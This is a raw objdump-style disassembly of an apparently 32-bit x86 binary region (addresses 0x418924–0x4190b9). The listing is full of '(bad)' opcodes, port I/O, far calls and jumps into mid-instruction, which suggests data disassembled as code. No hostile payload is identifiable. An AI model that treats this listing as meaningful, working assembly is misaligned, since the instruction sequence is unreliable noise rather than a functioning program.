  418924:	xor    ebx,DWORD PTR [esi]
  418926:	rol    BYTE PTR [edi+0x5341581f],cl
  41892c:	rcl    DWORD PTR [esi-0x6c],cl
  41892f:	in     al,0x78
  418931:	rcl    BYTE PTR [esp+edi*1+0x7f],1
  418935:	int    0x8c
  418937:	sub    eax,0x3c118a30
  41893c:	rcr    BYTE PTR [edi-0x11dabc3c],0xf7
  418943:	and    cl,BYTE PTR [bp+di]
  418946:	push   ds
  418947:	imul   ebp,DWORD PTR ds:0x55559c61,0x7830f1e4
  418951:	loopne 0x41890b
  418953:	cwde   
  418954:	jge    0x4189ca
  418956:	push   edi
  418957:	(bad)  
  418958:	cmp    ebx,esp
  41895a:	adc    ebx,DWORD PTR [edx+0x23eb29d3]
  418960:	ficom  DWORD PTR [edx+0x78]
  418963:	adc    BYTE PTR [ebx+0x49],cl
  418966:	je     0x41895a
  418968:	adc    ecx,eax
  41896a:	add    al,0x0
  41896c:	jge    0x418962
  41896e:	or     DWORD PTR [ebx+edi*4-0x37fde6d4],esi
  418975:	jns    0x41898b
  418977:	mov    dh,BYTE PTR [esi+0x649b002f]
  41897d:	dec    edx
  41897e:	in     al,dx
  41897f:	push   cs
  418980:	dec    eax
  418981:	lods   al,BYTE PTR ds:[esi]
  418982:	pop    es
  418983:	stos   DWORD PTR es:[edi],eax
  418984:	push   ecx
  418985:	lds    esp,FWORD PTR [esi]
  418987:	push   ds
  418988:	ins    BYTE PTR es:[edi],dx
  418989:	jnp    0x418964
  41898b:	leave  
  41898c:	daa    
  41898d:	les    ebp,FWORD PTR [ecx]
  41898f:	gs nop
  418991:	mov    eax,ds:0x4771bdaf
  418996:	add    al,0xca
  418998:	enter  0xe654,0xc5
  41899c:	jno    0x4189f2
  41899e:	xor    al,0xd6
  4189a0:	or     eax,0x9845a31f
  4189a5:	xchg   ecx,eax
  4189a6:	arpl   sp,si
  4189a8:	push   edi
  4189a9:	out    dx,eax
  4189aa:	in     al,0xb2
  4189ac:	sbb    ch,BYTE PTR [eax-0x26d014b2]
  4189b2:	dec    ebp
  4189b3:	push   0xffffff80
  4189b5:	jle    0x41897b
  4189b7:	aaa    
  4189b8:	(bad)  
  4189b9:	or     al,0x46
  4189bb:	fnstenv [edi]
  4189bd:	jecxz  0x418944
  4189bf:	pop    edi
  4189c0:	sar    DWORD PTR [esi-0x1f],0x2d
  4189c4:	mov    ebp,0x800be28d
  4189c9:	repnz push ebp
  4189cb:	test   al,0x36
  4189cd:	ds sbb ecx,edi
  4189d0:	in     al,dx
  4189d1:	es jp  0x4189f3
  4189d4:	fwait
  4189d5:	pop    es
  4189d6:	dec    ecx
  4189d7:	mov    ds:0xebd1475f,al
  4189dc:	xchg   esp,eax
  4189dd:	jns    0x418972
  4189df:	and    al,0x76
  4189e1:	icebp  
  4189e2:	stos   DWORD PTR es:[edi],eax
  4189e3:	shl    DWORD PTR [eax-0x1d],cl
  4189e6:	hlt    
  4189e7:	cmp    ch,bh
  4189e9:	in     eax,dx
  4189ea:	je     0x41898f
  4189ec:	movd   edx,mm1
  4189ef:	add    al,0x43
  4189f1:	pusha  
  4189f2:	out    0xb4,eax
  4189f4:	stc    
  4189f5:	sub    bl,ch
  4189f7:	mov    al,0xed
  4189f9:	out    0x3e,eax
  4189fb:	out    dx,al
  4189fc:	push   es
  4189fd:	mov    ds:0x9ff8d104,eax
  418a02:	xchg   esp,eax
  418a03:	int3   
  418a04:	mov    DWORD PTR [eax],esi
  418a06:	push   ebx
  418a07:	push   ss
  418a08:	jo     0x4189f3
  418a0a:	into   
  418a0b:	mov    al,ds:0x68847ea3
  418a10:	cli    
  418a11:	mov    WORD PTR [ecx],?
  418a13:	jg     0x4189a2
  418a15:	mov    eax,ds:0xeb5f3f69
  418a1a:	xor    BYTE PTR [eax],0xb3
  418a1d:	push   0x20ec34f2
  418a22:	jp     0x418a23
  418a24:	scas   eax,DWORD PTR es:[edi]
  418a25:	sbb    DWORD PTR ds:[edi+edi*2+0x7b4a27e0],0xc20985f
  418a31:	scas   al,BYTE PTR es:[edi]
  418a32:	add    bh,BYTE PTR [esi+ebx*1-0x124dc54a]
  418a39:	cmp    eax,0xfb01e826
  418a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a3f:	push   ebp
  418a40:	xlat   BYTE PTR ds:[ebx]
  418a41:	cmp    BYTE PTR [esp+ebx*1+0x22],al
  418a45:	xchg   BYTE PTR [esi],dl
  418a47:	cmp    BYTE PTR [edi],bh
  418a49:	shl    BYTE PTR [esi-0x17],cl
  418a4c:	mov    dh,0x8d
  418a4e:	sar    DWORD PTR [eax+0x4b],cl
  418a51:	out    0xd6,eax
  418a53:	ins    BYTE PTR es:[edi],dx
  418a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a55:	cmp    ecx,DWORD PTR [ebp+0x46b8c481]
  418a5b:	lods   al,BYTE PTR ds:[esi]
  418a5c:	xor    cl,ah
  418a5e:	cmc    
  418a5f:	es push 0xd3392ea0
  418a65:	ss xchg esi,eax
  418a67:	and    al,0x19
  418a69:	out    dx,eax
  418a6a:	and    dl,bl
  418a6c:	lahf   
  418a6d:	aaa    
  418a6e:	pop    ss
  418a6f:	arpl   di,dx
  418a71:	push   ecx
  418a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a73:	mov    eax,ds:0x588c38a0
  418a78:	clc    
  418a79:	bound  ebx,QWORD PTR [ebx+0x717892a3]
  418a7f:	rcr    dh,cl
  418a81:	lds    esp,FWORD PTR [esi+0x75]
  418a84:	push   ecx
  418a85:	sub    al,0xda
  418a87:	push   esp
  418a88:	lods   eax,DWORD PTR ds:[esi]
  418a89:	push   esi
  418a8a:	loop   0x418a72
  418a8c:	mul    BYTE PTR [ebx-0x420db1d4]
  418a92:	das    
  418a93:	daa    
  418a94:	aam    0x8d
  418a96:	mul    BYTE PTR [edi-0x33]
  418a99:	into   
  418a9a:	or     ebp,DWORD PTR [esi]
  418a9c:	scas   al,BYTE PTR es:[edi]
  418a9d:	add    eax,0x9d078952
  418aa2:	sub    ah,BYTE PTR [edx-0x58]
  418aa5:	sti    
  418aa6:	aaa    
  418aa7:	mov    eax,DWORD PTR [ebp-0x12]
  418aaa:	repz inc edi
  418aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aad:	dec    ecx
  418aae:	cmp    eax,0xde051dec
  418ab3:	int    0x9d
  418ab5:	clc    
  418ab6:	add    al,ch
  418ab8:	imul   ebx,DWORD PTR [edx],0x19
  418abb:	cmp    eax,0xeee5b5d0
  418ac0:	fcmovnu st,st(0)
  418ac2:	xchg   edx,eax
  418ac3:	int    0xe5
  418ac5:	mov    ah,0x86
  418ac7:	out    0xe3,al
  418ac9:	aam    0x5c
  418acb:	xchg   bl,dh
  418acd:	cmp    DWORD PTR [ebx],edx
  418acf:	cs jno 0x418ae1
  418ad2:	sbb    bl,BYTE PTR [ecx+0x4c8d2401]
  418ad8:	inc    BYTE PTR [edi]
  418ada:	and    DWORD PTR [ecx+ebx*1],ebp
  418add:	sbb    esi,DWORD PTR [esi+edx*4+0x42]
  418ae1:	int3   
  418ae2:	cmp    eax,0x3f0b6d8
  418ae7:	and    dh,0x89
  418aea:	shl    DWORD PTR [ecx-0x6920cd03],0xca
  418af1:	es push ebx
  418af3:	fbstp  TBYTE PTR [edx+0x31c38f22]
  418af9:	in     eax,0x91
  418afb:	sub    eax,0x83b42af9
  418b00:	cmp    edx,DWORD PTR [ecx+0x2ff60a9e]
  418b06:	out    dx,eax
  418b07:	sbb    edi,ebx
  418b09:	fsubr  QWORD PTR [edi]
  418b0b:	hlt    
  418b0c:	in     al,dx
  418b0d:	leave  
  418b0e:	inc    esi
  418b0f:	leave  
  418b10:	test   ecx,esp
  418b12:	jg     0x418af2
  418b14:	div    DWORD PTR [edx+0x21]
  418b17:	pop    es
  418b18:	fistp  WORD PTR [ebp+eiz*2+0x4e]
  418b1c:	jae    0x418abc
  418b1e:	adc    al,0xce
  418b20:	cmc    
  418b21:	adc    dh,BYTE PTR [edx]
  418b23:	sbb    eax,0x2f268f2b
  418b28:	jo     0x418b73
  418b2a:	and    DWORD PTR [ecx+0x66],esp
  418b2d:	add    edx,DWORD PTR [eax]
  418b2f:	mov    ch,0x66
  418b31:	sub    BYTE PTR [ebp+0x29],dh
  418b34:	add    ch,bh
  418b36:	xor    DWORD PTR [ebx+0x73],eax
  418b39:	fcomp  DWORD PTR [edx-0x526e9029]
  418b3f:	addr16 std 
  418b41:	push   ds
  418b42:	shl    BYTE PTR [esi+0x6e],cl
  418b45:	mov    ecx,0x5cd44c6e
  418b4a:	stos   DWORD PTR es:[edi],eax
  418b4b:	mov    cl,0x77
  418b4d:	fadd   QWORD PTR es:[ebx-0x3a]
  418b51:	inc    ebp
  418b52:	push   ebp
  418b53:	inc    eax
  418b54:	dec    ebp
  418b55:	mov    ds:0xf84724aa,eax
  418b5a:	ss mov bl,0xf
  418b5d:	pushf  
  418b5e:	shr    DWORD PTR [ecx+0x63bbb479],1
  418b64:	jge    0x418b3a
  418b66:	out    dx,eax
  418b67:	sub    al,0xa9
  418b69:	cmp    al,BYTE PTR [edx+edx*8]
  418b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b6d:	jecxz  0x418b9b
  418b6f:	jb     0x418b93
  418b71:	xchg   ebx,eax
  418b72:	and    cl,BYTE PTR [ebx]
  418b74:	or     ebx,DWORD PTR [edx]
  418b76:	ins    DWORD PTR es:[edi],dx
  418b77:	mov    ebp,0x717d26f3
  418b7c:	sbb    esp,DWORD PTR [edx+esi*4-0x63732e46]
  418b83:	sti    
  418b84:	sub    esp,edi
  418b86:	sbb    edi,DWORD PTR [esi+0x6c5bdc2c]
  418b8c:	bound  esi,QWORD PTR [ecx]
  418b8e:	icebp  
  418b8f:	loop   0x418bc9
  418b91:	retf   0x278f
  418b94:	aad    0x3a
  418b96:	and    DWORD PTR [ecx-0x70],esi
  418b99:	mov    ds:0x1de71c82,eax
  418b9e:	inc    eax
  418b9f:	sbb    eax,ebp
  418ba1:	sub    al,0xa1
  418ba3:	fs call 0x4773a9c0
  418ba9:	arpl   cx,dx
  418bab:	sar    DWORD PTR [ebx-0x35],cl
  418bae:	fbstp  TBYTE PTR [ebx-0x7a3067f6]
  418bb4:	pop    es
  418bb5:	inc    esi
  418bb6:	xchg   esi,eax
  418bb7:	call   0x362c:0xa2eafee9
  418bbe:	clc    
  418bbf:	cmp    eax,0x5706fe88
  418bc4:	cmp    BYTE PTR [ecx+0x42],0xb1
  418bc8:	popf   
  418bc9:	adc    al,0xc2
  418bcb:	ja     0x418c24
  418bcd:	ja     0x418bfd
  418bcf:	popf   
  418bd0:	test   al,0x80
  418bd2:	xchg   ecx,eax
  418bd3:	mov    ds:0x602e5517,al
  418bd8:	pushf  
  418bd9:	xchg   ecx,eax
  418bda:	inc    eax
  418bdb:	inc    eax
  418bdc:	push   ds
  418bdd:	add    al,0x7a
  418bdf:	std    
  418be0:	mov    edx,0x6657b5a6
  418be5:	xchg   ebp,eax
  418be6:	pop    esi
  418be7:	repz add ah,BYTE PTR [eax+0x72]
  418beb:	mov    ch,0x6
  418bed:	call   0x74b0:0x1954fc1
  418bf4:	xchg   edx,eax
  418bf5:	scas   al,BYTE PTR es:[edi]
  418bf6:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  418bf8:	push   ss
  418bf9:	data16 sbb dl,cl
  418bfc:	dec    edx
  418bfd:	mov    cl,0x4a
  418bff:	adc    dh,BYTE PTR [ebx+0x7f42dbc]
  418c05:	fld    TBYTE PTR [esi+0x2e98ed28]
  418c0b:	test   BYTE PTR ds:0x5fb11b32,bl
  418c11:	jp     0x418c3b
  418c13:	call   0xcaef:0x176f2cf2
  418c1a:	pop    ebx
  418c1b:	xchg   edx,eax
  418c1c:	sahf   
  418c1d:	xor    dl,dl
  418c1f:	fsub   QWORD PTR [edi+esi*8-0x57]
  418c23:	pop    es
  418c24:	test   BYTE PTR [ebp+0x38c87f62],al
  418c2a:	xor    bl,BYTE PTR [ecx-0x7d]
  418c2d:	je     0x418c04
  418c2f:	and    eax,0x5621404a
  418c34:	and    al,0xfe
  418c36:	shr    DWORD PTR [ebp-0x2b34f066],0xe1
  418c3d:	(bad)  
  418c3e:	fdiv   QWORD PTR [ebx+0x6bfe74d]
  418c44:	popf   
  418c45:	jp     0x418c2a
  418c47:	sub    DWORD PTR [eax-0x7cd3e7d9],esi
  418c4d:	xchg   ebx,eax
  418c4e:	cmp    BYTE PTR [esi+0x3a4be16a],0xea
  418c55:	and    ah,BYTE PTR [esp+ebx*4]
  418c58:	or     BYTE PTR [esi],0xdf
  418c5b:	jno    0x418c50
  418c5d:	sbb    eax,0x27bb9f88
  418c62:	mov    eax,ds:0x2a5949ed
  418c67:	ins    BYTE PTR es:[edi],dx
  418c68:	or     esi,edi
  418c6a:	jae    0x418c88
  418c6c:	imul   edi,DWORD PTR [esi],0xffffff83
  418c6f:	jae    0x418c06
  418c71:	jmp    0xec5c:0x28702c9f
  418c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c79:	(bad)  
  418c7a:	(bad)  
  418c7b:	repnz push ebp
  418c7d:	inc    edx
  418c7e:	jg     0x418ca1
  418c80:	or     BYTE PTR [edi+0x1959eb5b],bl
  418c86:	mov    DWORD PTR ds:0x3da2515f,ebx
  418c8c:	sub    eax,0xd0a4efac
  418c91:	xlat   BYTE PTR ds:[ebx]
  418c92:	cs xchg ebx,eax
  418c94:	sub    DWORD PTR [edx+esi*1],0xffffffba
  418c98:	sbb    DWORD PTR [ecx+0x618aa1ee],ebp
  418c9e:	jecxz  0x418c85
  418ca0:	mov    bl,bl
  418ca2:	imul   ebx,DWORD PTR [edx-0x48],0x1f61c6c3
  418ca9:	xor    DWORD PTR [esi],0xb8569a73
  418caf:	or     BYTE PTR [edi],ah
  418cb1:	popf   
  418cb2:	mov    esi,esp
  418cb4:	xor    DWORD PTR ds:0xed395152,edi
  418cba:	fimul  DWORD PTR [edx]
  418cbc:	push   ebx
  418cbd:	push   0x18
  418cbf:	cmp    al,0x34
  418cc1:	fldenv [ebp-0x74]
  418cc4:	adc    ebx,DWORD PTR [esi-0x44]
  418cc7:	xor    eax,0xb12260f2
  418ccc:	xchg   BYTE PTR [ebp-0x53],dl
  418ccf:	fsub   QWORD PTR [edx]
  418cd1:	sub    eax,DWORD PTR [edx-0x76b6566c]
  418cd7:	or     al,0x97
  418cd9:	mov    ebp,DWORD PTR [edx]
  418cdb:	adc    eax,0xbe06f0f3
  418ce0:	loopne 0x418d0e
  418ce2:	mov    esi,0x42a4e496
  418ce7:	(bad)  
  418ce9:	dec    esp
  418cea:	dec    ebx
  418ceb:	cli    
  418cec:	and    dl,BYTE PTR [edx+0x7df251b6]
  418cf2:	int3   
  418cf3:	mov    dl,cl
  418cf5:	xor    eax,0xad2156ba
  418cfa:	xlat   BYTE PTR ds:[ebx]
  418cfb:	call   0x2ed274dc
  418d00:	cs adc eax,0xa945f904
  418d06:	jb     0x418d00
  418d08:	hlt    
  418d09:	(bad)  
  418d0a:	jbe    0x418d37
  418d0c:	cwde   
  418d0d:	outs   dx,DWORD PTR ds:[esi]
  418d0e:	and    eax,0x5aa05eff
  418d13:	pop    edi
  418d14:	cmp    eax,0x334fda68
  418d19:	fwait
  418d1a:	sub    DWORD PTR [ebx],eax
  418d1c:	push   edx
  418d1d:	jp     0x418d75
  418d1f:	cmp    DWORD PTR [ebx+0x59c344a8],esi
  418d25:	ret    0x6047
  418d28:	push   ebp
  418d29:	add    al,0x67
  418d2b:	adc    bh,ah
  418d2d:	adc    edi,DWORD PTR [esi+0x62997817]
  418d33:	fisubr WORD PTR [esi+0x4c]
  418d36:	sbb    BYTE PTR ds:0x37bc6c1d,ah
  418d3c:	or     al,0x29
  418d3e:	nop
  418d3f:	mov    ebp,0xa972d305
  418d44:	jne    0x418cc6
  418d46:	cli    
  418d47:	clc    
  418d48:	xchg   ecx,eax
  418d49:	or     esi,DWORD PTR [ebx+0x3]
  418d4c:	add    BYTE PTR [eax],dl
  418d4e:	pop    eax
  418d4f:	mov    esp,0xb77719ac
  418d54:	fsincos 
  418d56:	fs icebp 
  418d58:	xchg   ebp,eax
  418d59:	xchg   edx,eax
  418d5a:	push   eax
  418d5b:	add    esp,ebx
  418d5d:	out    0x85,eax
  418d5f:	rcl    DWORD PTR [edi+0x3e],1
  418d62:	and    dh,BYTE PTR gs:0xb7d53c46
  418d69:	adc    al,0x5d
  418d6b:	dec    ecx
  418d6c:	pop    es
  418d6d:	dec    esp
  418d6e:	mov    esi,0x9612d6af
  418d73:	(bad)  
  418d74:	rcl    BYTE PTR [ebp-0x26206023],cl
  418d7a:	jecxz  0x418d58
  418d7c:	xchg   edx,eax
  418d7d:	sbb    al,0xcb
  418d7f:	into   
  418d80:	dec    edx
  418d81:	cdq    
  418d82:	and    DWORD PTR [edi],edi
  418d84:	cmc    
  418d85:	mov    edx,0xf89fdc45
  418d8a:	xchg   ecx,eax
  418d8b:	mov    WORD PTR [edi],gs
  418d8d:	xor    al,0x73
  418d8f:	pop    edx
  418d90:	ins    BYTE PTR es:[edi],dx
  418d91:	nop
  418d92:	push   ebx
  418d93:	(bad)  
  418d94:	neg    dl
  418d96:	cld    
  418d97:	pop    es
  418d98:	jg     0x418d89
  418d9a:	add    ecx,DWORD PTR [esi]
  418d9c:	mov    edx,0x57adfc39
  418da1:	in     al,dx
  418da2:	gs fwait
  418da4:	aad    0xa8
  418da6:	sbb    esp,DWORD PTR [ebx]
  418da8:	shl    BYTE PTR [eax+eiz*2+0x6e23b0b5],cl
  418daf:	out    dx,al
  418db0:	jno    0x418dc1
  418db2:	adc    BYTE PTR [ebx-0x72aedd0f],dh
  418db8:	mov    dh,0xb
  418dba:	xchg   BYTE PTR [edi-0x43],ch
  418dbd:	popf   
  418dbe:	mov    ebx,0x17d2514e
  418dc3:	add    BYTE PTR [edi+ecx*1-0x776e8302],cl
  418dca:	add    al,0x96
  418dcc:	(bad)  
  418dcd:	cli    
  418dce:	repnz xlat BYTE PTR ds:[ebx]
  418dd0:	inc    edi
  418dd1:	add    DWORD PTR [edi+0x118aff39],ebp
  418dd7:	xchg   BYTE PTR [edx+0x61],ch
  418dda:	xchg   esi,eax
  418ddb:	add    DWORD PTR [ebp+esi*8-0x5a],eax
  418ddf:	lods   eax,DWORD PTR ds:[esi]
  418de0:	lock enter 0x8fd4,0xb4
  418de5:	(bad)  
  418de6:	(bad)  
  418de7:	in     eax,dx
  418de8:	sub    dl,BYTE PTR [ebx]
  418dea:	repz push ebp
  418dec:	out    0x1a,al
  418dee:	dec    eax
  418def:	cmp    eax,0x19540cbc
  418df4:	dec    edx
  418df5:	mov    dh,0x8f
  418df7:	push   ecx
  418df8:	xchg   edx,eax
  418df9:	daa    
  418dfa:	inc    ecx
  418dfb:	jp     0x418e12
  418dfd:	repnz aaa 
  418dff:	mov    al,0x48
  418e01:	xor    al,0x39
  418e03:	mov    eax,0x4b9a0e13
  418e08:	popa   
  418e09:	imul   esp,edx,0xffffffe3
  418e0c:	add    eax,eax
  418e0e:	retf   0x4e58
  418e11:	add    DWORD PTR [edx+0x606e5af9],eax
  418e17:	mov    eax,ds:0x7eb32741
  418e1c:	imul   ebp,DWORD PTR [ebp+0x6dc2c684],0x33
  418e23:	jns    0x418e2c
  418e25:	dec    eax
  418e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e27:	inc    ecx
  418e28:	fsub   DWORD PTR [edi-0x33fd5abd]
  418e2e:	dec    bp
  418e30:	mov    dl,0xad
  418e32:	or     al,0x55
  418e34:	int    0x20
  418e36:	std    
  418e37:	outs   dx,BYTE PTR ds:[esi]
  418e38:	sbb    eax,0x6fcc893b
  418e3d:	fs into 
  418e3f:	aas    
  418e40:	xchg   ebp,eax
  418e41:	sbb    bh,ah
  418e43:	ret    0xfde4
  418e46:	cwde   
  418e47:	jecxz  0x418ebf
  418e49:	mov    ebp,0x839c6b40
  418e4e:	or     edi,DWORD PTR [edi+0x7eef0cd4]
  418e54:	aaa    
  418e55:	jnp    0x418e24
  418e57:	das    
  418e58:	push   0xffffffe8
  418e5a:	fisubr DWORD PTR [esi+0x5cff0bec]
  418e60:	lds    ebp,FWORD PTR [esi-0x3e6d0607]
  418e66:	mov    al,0x5e
  418e68:	mov    ch,0x2f
  418e6a:	mov    WORD PTR [eax+0x35],cs
  418e6d:	lods   al,BYTE PTR ds:[esi]
  418e6e:	jg     0x418e4b
  418e70:	or     edi,DWORD PTR [eax+0x57b16ed4]
  418e76:	inc    esi
  418e77:	xor    eax,DWORD PTR [ebp-0x55]
  418e7a:	cmp    DWORD PTR [ebx+0x62],esp
  418e7d:	loopne 0x418e08
  418e7f:	cmc    
  418e80:	cmp    ebp,ebp
  418e82:	fisttp WORD PTR [ecx+0x3]
  418e85:	fst    QWORD PTR [edx]
  418e87:	into   
  418e88:	lock and ecx,DWORD PTR [ebp-0x731f8be5]
  418e8f:	mov    eax,DWORD PTR [ebx+0x19]
  418e92:	retf   
  418e93:	mov    dh,0x2b
  418e95:	shl    DWORD PTR [ebp-0x119dee50],0x76
  418e9c:	scas   al,BYTE PTR es:[edi]
  418e9d:	dec    edi
  418e9e:	repnz dec esp
  418ea0:	sub    ecx,edi
  418ea2:	sub    edx,eax
  418ea4:	(bad)  
  418ea5:	jp     0x418e5b
  418ea7:	or     DWORD PTR fs:[esi],0x26
  418eab:	xor    eax,0x76d0f315
  418eb0:	adc    al,BYTE PTR [edx+0x4dd20471]
  418eb6:	(bad)  
  418eb7:	jmp    0x418e8c
  418eb9:	outs   dx,BYTE PTR ds:[esi]
  418eba:	inc    eax
  418ebb:	jp     0x418e8c
  418ebd:	dec    ebx
  418ebe:	mov    esp,0xb10f0e26
  418ec3:	std    
  418ec4:	test   DWORD PTR [eax],ecx
  418ec6:	ds mov bh,0x18
  418ec9:	dec    ecx
  418eca:	lock imul ebx,esi,0x5a557c7d
  418ed1:	pusha  
  418ed2:	call   0xd9303645
  418ed7:	pop    es
  418ed8:	xchg   edi,eax
  418ed9:	imul   eax,DWORD PTR [edi-0x16],0x47fbe52d
  418ee0:	lahf   
  418ee1:	mov    cx,fs
  418ee4:	(bad)  
  418ee5:	xchg   edi,eax
  418ee6:	mov    cl,0x36
  418ee8:	retf   
  418ee9:	mov    dl,0xc
  418eeb:	retf   
  418eec:	je     0x418eab
  418eee:	jle    0x418f08
  418ef0:	xor    eax,0xcb7316c6
  418ef5:	push   cs
  418ef6:	dec    ebp
  418ef7:	std    
  418ef8:	xlat   BYTE PTR ds:[ebx]
  418ef9:	sbb    eax,0x59cf6dd2
  418efe:	aaa    
  418eff:	jg     0x418f18
  418f01:	adc    esp,DWORD PTR [eax+ebp*2+0x47]
  418f05:	or     al,0xfe
  418f07:	(bad)  
  418f09:	and    DWORD PTR [eax],esi
  418f0b:	dec    esp
  418f0c:	ret    0x964a
  418f0f:	lahf   
  418f10:	fistp  DWORD PTR [ebx-0x219d78ff]
  418f16:	std    
  418f17:	inc    eax
  418f18:	dec    esp
  418f19:	jle    0x418f5f
  418f1b:	call   0x7caa:0x5dc29c3c
  418f22:	fmul   st(5),st
  418f24:	push   edx
  418f25:	mov    dh,0x7e
  418f27:	dec    esp
  418f28:	xlat   BYTE PTR ds:[ebx]
  418f29:	dec    ebx
  418f2a:	or     BYTE PTR ds:0x9683472f,0x6b
  418f31:	inc    DWORD PTR [ecx-0x39]
  418f34:	sbb    al,0x3
  418f36:	adc    DWORD PTR [ecx-0x4a6ee2e0],eax
  418f3c:	cmc    
  418f3d:	pop    edx
  418f3e:	(bad)  
  418f3f:	or     BYTE PTR [eax-0x52],ah
  418f42:	lea    esp,[esi+0x43]
  418f45:	arpl   WORD PTR [eax+edx*4+0x3f1cc1fe],sp
  418f4c:	inc    esi
  418f4d:	outs   dx,DWORD PTR ds:[esi]
  418f4e:	mov    cl,0xd5
  418f50:	jbe    0x418ee9
  418f52:	mov    edi,0xda9c99c8
  418f57:	imul   ebp,DWORD PTR [edi+0x3faa050d],0x7e
  418f5e:	repz loopne 0x418f48
  418f61:	int3   
  418f62:	mov    bl,0xb3
  418f64:	and    DWORD PTR [ebx],0xffffff9e
  418f67:	xor    eax,0x17cfc96e
  418f6c:	outs   dx,BYTE PTR ds:[esi]
  418f6d:	and    DWORD PTR [edi-0x3dc9db34],0xffffffdb
  418f74:	fdivr  DWORD PTR [eax-0x26]
  418f77:	idiv   BYTE PTR [ecx+0x2d]
  418f7a:	das    
  418f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f7c:	lds    esi,FWORD PTR [edx-0x55]
  418f7f:	stc    
  418f80:	jne    0x418f3d
  418f82:	aaa    
  418f83:	jno    0x418fd7
  418f85:	cli    
  418f86:	iret   
  418f87:	out    0xc4,eax
  418f89:	(bad)  
  418f8a:	jmp    0x418fe1
  418f8c:	cmc    
  418f8d:	mov    DWORD PTR ds:0x6e719f09,0xb31a34c2
  418f97:	mov    edx,0xb8a7f234
  418f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f9d:	adc    DWORD PTR [edx-0x3f],esi
  418fa0:	jb     0x418f8f
  418fa2:	xchg   DWORD PTR [edi-0x2f],ecx
  418fa5:	jecxz  0x418fa3
  418fa7:	push   ecx
  418fa8:	retf   
  418fa9:	mov    dh,BYTE PTR [ebx+0x64]
  418fac:	push   esi
  418fad:	inc    edi
  418fae:	pop    ds
  418faf:	fwait
  418fb0:	lock sub ecx,esp
  418fb3:	rcr    DWORD PTR ds:0x778e53e1,0x7
  418fba:	outs   dx,DWORD PTR ds:[esi]
  418fbb:	mov    ecx,0xac18c6c
  418fc0:	jb     0x418f78
  418fc2:	rcr    BYTE PTR [edi],cl
  418fc4:	cmc    
  418fc5:	mov    esi,DWORD PTR [edi]
  418fc7:	push   eax
  418fc8:	dec    ebx
  418fc9:	mov    eax,0x2b85b4b3
  418fce:	scas   eax,DWORD PTR es:[edi]
  418fcf:	cmp    cl,BYTE PTR [edx+ecx*8-0x80]
  418fd3:	or     eax,0x597f2d38
  418fd8:	mov    esp,0x115150ff
  418fdd:	scas   eax,DWORD PTR es:[edi]
  418fde:	enter  0xf8ae,0xf3
  418fe2:	test   bh,cl
  418fe4:	test   DWORD PTR [ebp-0x3855f435],edx
  418fea:	inc    edx
  418feb:	mov    ss,WORD PTR [ecx-0x71]
  418fee:	pop    ecx
  418fef:	cli    
  418ff0:	sub    eax,0xfddaa218
  418ff5:	sub    ebp,DWORD PTR [edi+0x69]
  418ff8:	imul   edi,DWORD PTR [esi-0x25],0x1f
  418ffc:	outs   dx,BYTE PTR ds:[esi]
  418ffd:	or     eax,0x55d24b40
  419002:	mov    dl,0x21
  419004:	inc    ecx
  419005:	jb     0x418f9f
  419007:	mov    ebp,0x5a650b35
  41900c:	xchg   esp,eax
  41900d:	and    ebp,0x6
  419010:	fwait
  419011:	push   esp
  419012:	pop    esi
  419013:	aas    
  419014:	pop    edx
  419015:	push   ebp
  419016:	rcr    DWORD PTR [ebp-0x32],0xc0
  41901a:	and    BYTE PTR [edx],bl
  41901c:	mov    cl,0xd0
  41901e:	out    dx,al
  41901f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419020:	ins    BYTE PTR es:[edi],dx
  419021:	xor    ebx,DWORD PTR ds:0xfbc82b8d
  419027:	mov    ch,0x84
  419029:	sub    eax,DWORD PTR [eax+0x6a]
  41902c:	inc    esi
  41902d:	or     eax,0x45cb97a8
  419032:	(bad)  
  419033:	cmp    eax,ebx
  419035:	jnp    0x419052
  419037:	cwde   
  419038:	inc    edx
  419039:	popa   
  41903a:	xchg   esp,eax
  41903b:	and    ah,BYTE PTR [ebx+0x54]
  41903e:	mul    DWORD PTR [esi-0x17f3fc54]
  419044:	pop    es
  419045:	test   DWORD PTR [eax-0x4e],ecx
  419048:	and    DWORD PTR [ebp-0x5b3e20b7],ecx
  41904e:	xor    eax,0xff791fa0
  419053:	enter  0x75fe,0xbe
  419057:	arpl   WORD PTR [eax],bx
  419059:	outs   dx,BYTE PTR ds:[esi]
  41905a:	mov    bh,0x4
  41905c:	lahf   
  41905d:	cmp    DWORD PTR [edi+0x77],esp
  419060:	dec    ecx
  419061:	cmc    
  419062:	mov    edx,0x7293a4dc
  419067:	push   ds
  419068:	mov    bl,0x7e
  41906a:	gs leave 
  41906c:	inc    eax
  41906d:	icebp  
  41906e:	and    esp,DWORD PTR es:[edi+edx*2-0x12]
  419073:	clc    
  419074:	rcr    DWORD PTR [edi-0x16],1
  419077:	dec    DWORD PTR [ecx+ecx*4+0x58]
  41907b:	adc    DWORD PTR [edi+ebx*2-0x3a279910],ecx
  419082:	jo     0x4190d5
  419084:	xchg   ebp,eax
  419085:	mov    ch,0xe
  419087:	imul   ebp,esi,0x6f4820d5
  41908d:	out    dx,eax
  41908e:	sbb    DWORD PTR [edx+edx*2-0x59],ebp
  419092:	outs   dx,DWORD PTR ds:[esi]
  419093:	loope  0x41902d
  419095:	ss mov dl,dh
  419098:	dec    ebp
  419099:	cmp    al,BYTE PTR [ebx]
  41909b:	iret   
  41909c:	in     eax,dx
  41909d:	push   eax
  41909e:	sub    ah,BYTE PTR [ecx+ebp*8+0x58]
  4190a2:	ja     0x419056
  4190a4:	fmul   DWORD PTR [esi]
  4190a6:	adc    BYTE PTR [eax+eax*2+0x13d06e84],ah
  4190ad:	pop    ebx
  4190ae:	aaa    
  4190af:	jecxz  0x41910a
  4190b1:	out    dx,al
  4190b2:	lock cmp eax,0x55898276
  4190b8:	stos   DWORD PTR es:[edi],eax
  4190b9:	int    0xd7
